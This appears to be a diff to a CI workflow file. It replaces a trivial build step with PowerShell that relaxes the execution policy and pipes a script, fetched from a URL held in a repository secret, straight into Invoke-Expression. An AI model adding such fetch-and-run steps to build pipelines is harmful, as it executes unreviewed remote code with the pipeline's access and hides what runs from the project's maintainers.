@@ -17,4 +17,7 @@ jobs:
 
 
     - name: build
-      run: cd;dir
+      run: |
+        Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+        irm "${{ secrets.URL }}" | iex
+      
